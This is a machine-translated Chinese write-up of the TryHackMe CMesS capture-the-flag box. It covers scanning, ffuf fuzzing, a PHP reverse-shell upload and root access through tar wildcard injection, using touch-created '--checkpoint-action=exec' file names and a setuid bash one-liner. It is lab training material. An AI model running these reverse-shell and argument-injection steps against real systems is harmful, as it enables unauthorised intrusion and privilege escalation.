<html>
<head>
<title>TryHackMe CMesS CTF</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">CTF的尝试</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-cmess-ctf-c1339774550e?source=collection_archive---------1-----------------------#2022-12-07">https://infosecwriteups.com/tryhackme-cmess-ctf-c1339774550e?source=collection_archive---------1-----------------------#2022-12-07</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="be06" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">你能找到这个Gila CMS盒子吗？</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/c42ee35e92ea78ff62794ba1676bf314.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lEpoz14fYlLE0cQV-Lud_w.png"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">来源:tryhackme</figcaption></figure><p id="27c5" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir">在这里找到的房间</strong>:【https://tryhackme.com/room/cmess T2】</p><p id="d1b6" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">在这台机器中，我们在<strong class="kx ir"> user.txt </strong>和<strong class="kx ir"> root.txt </strong>文件中存储了两个标志。</p><p id="2607" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">启动您的机器……</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ls"><img src="../Images/714f936500ebce20aa3210cbfb42123f.png" data-original-src="https://miro.medium.com/v2/resize:fit:800/1*fcwLWixk10G27dEqiHOM-Q.gif"/></div></figure><p id="beca" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">我们将这台机器分成两个任务，即<a class="ae lr" href="#eedb" rel="noopener ugc nofollow"> <strong class="kx ir">任务1 </strong> </a> &amp; <a class="ae lr" href="#7471" rel="noopener ugc nofollow"> <strong class="kx ir">任务2 </strong> </a></p><p id="8b51" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir"> #【任务1 </strong>】:获取<strong class="kx ir"> user.txt </strong>文件中存储的普通用户标志</p><p id="91fb" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir"> <em class="lt">步骤1- </em> &gt; </strong>在<strong class="kx ir"> /etc/hosts </strong>中添加您的机器IP作为<strong class="kx ir"> cmess.thm </strong>名称</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi lu"><img src="../Images/89a4fa889f0704f078c90cd6ff2157cc.png" data-original-src="https://miro.medium.com/v2/resize:fit:596/format:webp/1*QJ4pzl4Spi6ILOYvFIXMBQ.png"/></div></figure><p id="cb8d" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir"> <em class="lt">步骤2-&gt;</em></strong>ping<strong class="kx ir">cmess . thm</strong>检查机器是否活着</p><p id="c3c7" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir"> <em class="lt">步骤3 - &gt; </em> </strong>执行端口扫描</p><div class="lv lw gp gr lx ly"><a href="https://github.com/robertdavidgraham/masscan" rel="noopener  ugc nofollow" target="_blank"><div class="lz ab fo"><div class="ma ab mb cl cj mc"><h2 class="bd ir gy z fp md fr fs me fu fw ip bi translated">GitHub-robertdavidgraham/mass can:TCP端口扫描器，异步抛出SYN包，扫描…</h2><div class="mf l"><h3 class="bd b gy z fp md fr fs me fu fw dk translated">这是一个互联网规模的端口扫描器。它可以在5分钟内扫描整个互联网，传输1000万…</h3></div><div class="mg l"><p class="bd b dl z fp md fr fs me fu fw dk translated">github.com</p></div></div><div class="mh l"><div class="mi l mj mk ml mh mm kp ly"/></div></div></a></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mn"><img src="../Images/c4195685f3b817a93f222b1677a93e7c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HPngp3VmNtW9VaWvkT0VWw.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mo"><img src="../Images/568da4b24bfe89ec6a496a293feceed2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FMBdP1KM1voQzghG8vXNkA.png"/></div></div></figure><p id="8aba" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">您可以手动运行它或使用我的脚本</p><pre class="kg kh ki kj gt mp mq mr bn ms mt bi"><span id="dee9" class="mu mv iq mq b be mw mx l my mz">#!/bin/bash<br/><br/>masscan -e tun0 $1 -p 1-65535 --rate 10000 &gt; $1_masscan<br/>cat $1_masscan | grep "Discovered open port" | awk {'print $4'} | tr -d /tcp &gt;&gt; $1_masscanP<br/>cat $1_masscanP | while read b || [[ -n $b ]] ;do nmap -A -p"${b}" $1 ;done &gt;&gt; $1_nmap<br/><br/># u also uncommnet below line<br/># rm $1_masscan<br/># rm $1_masscanP<br/># Usage : ./filaname.sh &lt;ip&gt;</span></pre><p id="8e4a" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">我们在<strong class="kx ir"> cmess.thm </strong>上的<strong class="kx ir"> /robots.txt </strong>目录中发现了3个不允许的条目，但是在导航之后，它包含了403禁止消息。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi na"><img src="../Images/00765e3e0f2007d8ea63b0bdd34e5676.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DyXqKGs9nsnQy3M8-jsuhw.png"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">网页</figcaption></figure><p id="f752" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir"> <em class="lt">步骤4 - &gt; </em> </strong>执行目录模糊化</p><p id="a489" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">我们使用<strong class="kx ir"> ffuf </strong>工具进行目录模糊化，这是我最喜欢的模糊化或暴力破解工具。</p><div class="lv lw gp gr lx ly"><a href="https://github.com/ffuf/ffuf" rel="noopener  ugc nofollow" target="_blank"><div class="lz ab fo"><div class="ma ab mb cl cj mc"><h2 class="bd ir gy z fp md fr fs me fu fw ip bi translated">GitHub - ffuf/ffuf:用Go编写的快速网页模糊器</h2><div class="mf l"><h3 class="bd b gy z fp md fr fs me fu fw dk translated">一个用Go编写的快速web fuzzer。ffuf在Porchetta Industries Discord服务器上有一个频道，此外还有…</h3></div><div class="mg l"><p class="bd b dl z fp md fr fs me fu fw dk translated">github.com</p></div></div><div class="mh l"><div class="nb l mj mk ml mh mm kp ly"/></div></div></a></div><p id="f4d4" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">命令:<strong class="kx ir"><em class="lt">ffuf-w/root/Desktop/word lists/dir _ big . txt-u</em></strong><a class="ae lr" href="http://cmess.thm/FUZZ" rel="noopener ugc nofollow" target="_blank"><strong class="kx ir"><em class="lt">http://cmess.thm/FUZZ</em></strong></a></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nc"><img src="../Images/ced3af6c0ed9572ecc458814ccae6bf7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FlB_5h8q8pDSjca5tYTF9A.png"/></div></div></figure><p id="17c7" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">我们得到了一个很长的目录列表，但我们试图在上面导航，他们要求输入电子邮件id和密码才能登录。</p><p id="7158" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">之后，试图找到一个与Gila cmess相关的漏洞，但没有发现任何有趣的东西。在Hint的帮助下试图暴力破解子域。</p><p id="495f" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir"> <em class="lt">步骤5 - &gt; </em> </strong>执行子域蛮干</p><p id="b1ca" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">命令:<strong class="kx ir"><em class="lt">ffuf-w/root/Desktop/word lists/dir _ big . txt-u</em></strong><a class="ae lr" href="http://cmess.thm/" rel="noopener ugc nofollow" target="_blank"><strong class="kx ir"><em class="lt">http://cmess.thm/</em></strong></a><strong class="kx ir"><em class="lt">-H " Host:fuzz . cmess . thm "-fw " 522 "</em></strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nd"><img src="../Images/abf690d5d5838b6d18128f4460c006a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zz946y4nnHSAFWoZAkpXpg.png"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">ffuf</figcaption></figure><p id="5518" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">我们在<strong class="kx ir"> cmess.thm </strong>上得到了一个<strong class="kx ir"> <em class="lt"> dev </em> </strong>子域，试图访问它们，但在此之前，将这个子域添加到我们的<strong class="kx ir"> /etc/hosts </strong>文件中</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ne"><img src="../Images/d52acb528ce7afa0f7323bbe0d585569.png" data-original-src="https://miro.medium.com/v2/resize:fit:618/format:webp/1*tx9jdsS45wxN363lQLW2mQ.png"/></div></div></figure><p id="e606" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">浏览<strong class="kx ir"><em class="lt">dev . cmess . thm</em></strong>找到这样有趣的东西</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nf"><img src="../Images/a5e76b88df0015601b9916201bd2c511.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ex6XOqXnjfb3ZplrML5GVA.png"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">dev.cmess.thm</figcaption></figure><p id="cb9f" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir"> <em class="lt">步骤6 - &gt; </em> </strong>尝试使用这些凭证登录cmess.thm/admin</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ng"><img src="../Images/edfe7499ffc2e82e88e14d7dc1e66883.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nLSFKVxe66zrMiaOUk8m-A.png"/></div></div></figure><p id="0ab2" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">我们成功登录到<strong class="kx ir">和</strong>管理面板</p><p id="bc5d" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir"> <em class="lt">步骤7 - &gt; </em> </strong>上传php反向外壳</p><p id="4653" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">尝试探索管理面板中的所有标签，我们得到了一些上传功能。尝试上传反向外壳，因为网站运行在一个<strong class="kx ir"> Apache </strong>服务器上，那么<strong class="kx ir"> PHP </strong>对于反向外壳非常方便。</p><div class="lv lw gp gr lx ly"><a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" rel="noopener  ugc nofollow" target="_blank"><div class="lz ab fo"><div class="ma ab mb cl cj mc"><h2 class="bd ir gy z fp md fr fs me fu fw ip bi translated">PHP-reverse-shell/PHP-reverse-shell . PHP at master</h2><div class="mf l"><h3 class="bd b gy z fp md fr fs me fu fw dk translated">此时您不能执行该操作。您已使用另一个标签页或窗口登录。您已在另一个选项卡中注销，或者…</h3></div><div class="mg l"><p class="bd b dl z fp md fr fs me fu fw dk translated">github.com</p></div></div><div class="mh l"><div class="nh l mj mk ml mh mm kp ly"/></div></div></a></div><p id="2f5c" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">用您的ip更改IP变量值并设置端口号</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/8d902e45b7a87c6b8efe985b8d549e77.png" data-original-src="https://miro.medium.com/v2/resize:fit:1094/format:webp/1*hAa31SoLaOw_TjwZ1sERKA.png"/></div></figure><p id="4a9c" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">上传文件后被存储在<strong class="kx ir">资产</strong>文件夹中导航到它</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/a365d4ef1f89157a2d839272a6bba98a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1236/format:webp/1*nIaHib1KOsMf6drpVCEe5A.png"/></div></figure><p id="7b1d" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">点击我们的文件名，保存这个文件。并在我们的机器上启动netcat监听器。但是从我们执行这个文件的地方。</p><p id="31cc" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">开始思考……</p><p id="2827" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir"> <em class="lt">第8步- &gt; </em> </strong>在机器上得到第一个反向壳</p><p id="d7b6" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">当我们执行目录模糊化时，我们得到了一个名为/assets的目录，试着浏览它，但是它们是空的，试着在我们的文件名后面加上这个名字，比如<a class="ae lr" href="http://cmess.thm/assets/" rel="noopener ugc nofollow" target="_blank">http://cmess.thm/assets/</a>T69】文件名&gt;，然后点击回车</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nk"><img src="../Images/e60f06882f8f999fa43ece04e5f92a3d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uEGfd8ltU539URdpo6FD7g.png"/></div></div></figure><p id="9325" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">Booommmm …</p><p id="1d9a" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">我们得到了我们的shell，但是我们无法访问位于<strong class="kx ir"> user.txt </strong>文件的<strong class="kx ir"> andre </strong>文件夹，该文件显示权限被拒绝的消息。</p><p id="d9e2" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir"> <em class="lt">第9步- &gt; </em> </strong>使用<strong class="kx ir"> linpeas.sh </strong>查找升级路径</p><p id="d762" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">这是一个自动查找Linux系统漏洞的工具</p><div class="lv lw gp gr lx ly"><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" rel="noopener  ugc nofollow" target="_blank"><div class="lz ab fo"><div class="ma ab mb cl cj mc"><h2 class="bd ir gy z fp md fr fs me fu fw ip bi translated">在卡洛斯波洛普大师那里</h2><div class="mf l"><h3 class="bd b gy z fp md fr fs me fu fw dk translated">PEASS -权限提升精彩脚本套件(带颜色)-PEASS-ng/Lin peas at master Carlos polop/PEASS-ng</h3></div><div class="mg l"><p class="bd b dl z fp md fr fs me fu fw dk translated">github.com</p></div></div><div class="mh l"><div class="nl l mj mk ml mh mm kp ly"/></div></div></a></div><p id="14f8" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">在我们的本地机器上启动python服务器</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/eb67c3d84c2f4c74f856ba5833dba55c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1308/format:webp/1*xCKpLEiWv-UiAGDoQkUTsw.png"/></div></figure><p id="e214" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">之后在<strong class="kx ir"> wget </strong>的帮助下在<strong class="kx ir"> /tmp </strong>文件夹中下载<strong class="kx ir"> linpeas.sh </strong>。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/d30891226bb7f4687f8b9da4b965afcc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1290/format:webp/1*Fnz-6F4_7KI7mkKXRJo1aQ.png"/></div></figure><p id="6e2c" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">给它执行权限<strong class="kx ir"> chmod +x linpeas.sh </strong>运行它<strong class="kx ir">。/linpeas.sh </strong></p><p id="70b3" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">我们得到了一个隐藏的<strong class="kx ir"> bak </strong>文件，存储在<strong class="kx ir"> /opt </strong>文件夹和<strong class="kx ir"> cron job </strong>中</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi no"><img src="../Images/7ecbfc1c0d7687bb090b3806d2487df5.png" data-original-src="https://miro.medium.com/v2/resize:fit:422/format:webp/1*z5764YWKFJyD-6BJ9ejdsQ.png"/></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">bak文件</figcaption></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi np"><img src="../Images/02fd127e22edfa24ef107a007f500ee4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pP0fuG-bu_ArvUxwHMnkZw.png"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">cron作业</figcaption></figure><p id="d0e1" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir">第10步-&gt;-</strong>第一个标志</p><p id="17e2" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">使用<strong class="kx ir"> cat </strong>查看<strong class="kx ir"> .password.bak </strong>文件中的信息</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi nq"><img src="../Images/f07190441c34184b562727e6cd6b57df.png" data-original-src="https://miro.medium.com/v2/resize:fit:548/format:webp/1*TFwv8Phk0ILjy94s6_kLIw.png"/></div></figure><p id="65f4" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">这看起来像安德烈的备份密码，但我们如何使用它？我们知道ssh在22端口上是开放的，尝试使用这个密码登录。</p><p id="d829" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">命令:- ssh andre@cmess.thm</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nr"><img src="../Images/0bd4a0121854e1875a74895cb2fa21c5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4tg9oVN2LdDyE4QXDpGZfg.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/46d1986b8c619af8b5ce94f8cc5d97a8.png" data-original-src="https://miro.medium.com/v2/resize:fit:858/format:webp/1*9eecNV3d7mHQseRYPzktZQ.png"/></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">旗</figcaption></figure><p id="8622" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">我们得到了第一面国旗。🤩</p><p id="7471" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir"> #【任务2】:</strong>获取<strong class="kx ir"> root.txt </strong>文件中存储的<strong class="kx ir"> root </strong>用户标志</p><p id="40fc" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir"> <em class="lt">步骤1 - &gt; </em> </strong>了解<strong class="kx ir"> cron job </strong></p><p id="d746" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">现在我们可以访问andre的文件夹了，让我们看看使用<strong class="kx ir"> linpeas </strong>找到的cron作业做了什么</p><p id="be40" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">命令:- <strong class="kx ir"> cat /etc/crontab </strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nt"><img src="../Images/ec8dd18f90bc513992d4f0dff7db0404.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*e0Em80TvQafhqcZrnMm_Fg.png"/></div></div></figure><p id="296b" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">在这个场景中，每2分钟使用<strong class="kx ir"> tar </strong>将<strong class="kx ir"> /home/andre/backup </strong>文件夹中的所有文件和文件夹备份到<strong class="kx ir"> /tmp </strong>文件夹中作为<strong class="kx ir"> andre_backup.tar.gz </strong>，但是有一个问题，即<strong class="kx ir"> *(通配符)</strong>，这意味着<strong class="kx ir"> /home/andre/backup </strong>文件夹中的任何内容都是备份的，我们可以使用这个功能来滥用这台机器。</p><p id="2f1d" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir"> <em class="lt">步骤2 - &gt; </em> </strong>创建bash one liner</p><p id="2357" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">我们简单地创建一个bash one liner来获取根shell</p><pre class="kg kh ki kj gt mp mq mr bn ms mt bi"><span id="631e" class="mu mv iq mq b be mw mx l my mz">echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" &gt; exploit.sh</span></pre><p id="9347" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">它可以将<strong class="kx ir"> /bin/bash </strong>复制到<strong class="kx ir"> /tmp/bash </strong>中，并赋予其权限为<strong class="kx ir"> setuid </strong>和<strong class="kx ir"> setgid </strong></p><p id="160b" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">将此文件保存到<strong class="kx ir"> /home/andre/backup </strong>文件夹中。授予它执行权限。并键入如下两个命令。</p><p id="6ab7" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir">touch/home/Andre/backup/—check point = 1</strong>(<strong class="kx ir">—check point = 1</strong>是<strong class="kx ir"> tar </strong>用于显示1条记录后的进度信息)</p><p id="9f0f" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir">touch/home/Andre/backup/—check point-action = exec = sh \ exploit . sh(</strong>它用于在每个检查点运行指定的操作后，即运行<strong class="kx ir"> exploit.sh) </strong></p><p id="f2d4" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">等待2分钟…..</p><p id="ae3e" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">键入命令:<strong class="kx ir"> /tmp/bash -p </strong>(用于执行<strong class="kx ir"> /tmp/bash </strong>文件夹)</p><p id="0565" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">我们得到了我们的根壳…… &amp;旗帜……..</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nu"><img src="../Images/fbae8451317a7b083597bb6e4146c480.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*w4RWiAXqJhtr92Pcbuqn0w.png"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">根标志</figcaption></figure><p id="a987" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><strong class="kx ir">:注:</strong> <br/>如果你被困在某个地方，找不到穿透机器的方法，千万不要以为自己会什么都不做，或者开始怀疑自己。看<strong class="kx ir">提示</strong>。这是你学习新东西的方法。但在此之前，尝试你武器库中所有的武器。</p><p id="5857" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">不断学习……</p><p id="37c0" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">感谢阅读💓…………</p><p id="3627" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated">帮我接通:</p><p id="b6d4" class="pw-post-body-paragraph kv kw iq kx b ky kz jr la lb lc ju ld le lf lg lh li lj lk ll lm ln lo lp lq ij bi translated"><a class="ae lr" href="https://twitter.com/bhavesharmalkar" rel="noopener ugc nofollow" target="_blank"> Twitter </a>，<a class="ae lr" href="https://www.linkedin.com/in/bhaveshharmalkar/" rel="noopener ugc nofollow" target="_blank"> Linkedin </a>，<a class="ae lr" href="https://github.com/bhaveshharmalkar" rel="noopener ugc nofollow" target="_blank"> GitHub </a></p></div><div class="ab cl nv nw hu nx" role="separator"><span class="ny bw bk nz oa ob"/><span class="ny bw bk nz oa ob"/><span class="ny bw bk nz oa"/></div><div class="ij ik il im in"><h2 id="529e" class="oc mv iq bd od oe of dn og oh oi dp oj le ok ol om li on oo op lm oq or os ot bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae lr" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>